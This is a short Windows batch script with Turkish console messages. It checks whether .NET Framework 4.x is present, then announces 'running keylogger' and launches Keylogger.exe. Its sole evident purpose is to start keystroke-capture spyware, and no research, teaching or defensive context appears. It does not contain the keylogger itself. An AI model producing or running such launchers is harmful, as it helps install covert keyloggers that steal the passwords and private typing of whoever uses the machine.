@echo off
echo .NET Framework Kontrol Ediliyor...
echo.
if exist "%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\mscorlib.dll" (
    echo .NET Framework 4.x bulundu!
) else (
    echo .NET Framework 4.x bulunamadi!
)
echo.
echo Keylogger calistiriliyor...
Keylogger.exe
pause
